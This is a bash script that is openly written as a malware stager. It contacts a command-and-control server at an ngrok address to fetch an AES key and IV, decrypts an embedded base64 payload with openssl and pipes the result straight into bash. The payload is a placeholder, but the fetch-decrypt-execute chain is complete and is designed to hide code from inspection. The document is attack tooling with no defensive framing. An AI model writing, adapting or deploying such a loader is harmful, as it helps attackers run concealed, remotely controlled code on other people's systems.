#!/bin/bash

# Fetch key and IV from C2 server
ATTACKER_IP="${ATTACKER_IP:-3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app}"
ATTACKER_PORT="${ATTACKER_PORT:-8080}"
KEY_JSON=$(curl -s "http://${ATTACKER_IP}:${ATTACKER_PORT}/key")
if [ $? -ne 0 ]; then
    echo "Failed to fetch key from C2 server" >&2
    exit 1
fi
KEY=$(echo "$KEY_JSON" | grep -o '"key":"[^"]*"' | cut -d'"' -f4)
IV=$(echo "$KEY_JSON" | grep -o '"iv":"[^"]*"' | cut -d'"' -f4)
if [ -z "$KEY" ] || [ -z "$IV" ]; then
    echo "Invalid key or IV received" >&2
    exit 1
fi

# Embedded encrypted script (base64-encoded ciphertext)
ENCRYPTED_SCRIPT="ENCRYPTED_SCRIPT" # Replace with actual ciphertext

# Decrypt and execute
echo "$ENCRYPTED_SCRIPT" | base64 -d | openssl enc -aes-256-cbc -d -K "$(echo -n "$KEY" | base64 -d | xxd -p -c32)" -iv "$(echo -n "$IV" | base64 -d | xxd -p -c16)" | bash -s -- "$@"
if [ $? -ne 0 ]; then
    echo "Failed to decrypt or execute script" >&2
    exit 1
fi
